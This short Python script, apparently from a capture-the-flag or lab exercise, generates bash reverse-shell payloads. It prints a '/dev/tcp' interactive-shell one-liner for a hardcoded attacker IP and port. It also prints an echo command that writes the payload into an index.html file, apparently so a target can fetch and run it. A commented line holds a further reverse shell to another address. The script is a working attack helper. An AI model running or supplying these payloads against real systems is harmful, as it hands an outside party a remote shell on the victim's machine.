
if __name__ == '__main__':
    ip = "10.10.14.7"
    port = '80'

    # echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.13/1234 0>&1"' > index.html

    print('/bin/bash -c "bash -i >& /dev/tcp/{}/{} 0>&1"'.format(ip,port))
    print('''echo '/bin/bash -c "bash -i >& /dev/tcp/{}/{} 0>&1"' > index.html '''.format(ip,port))
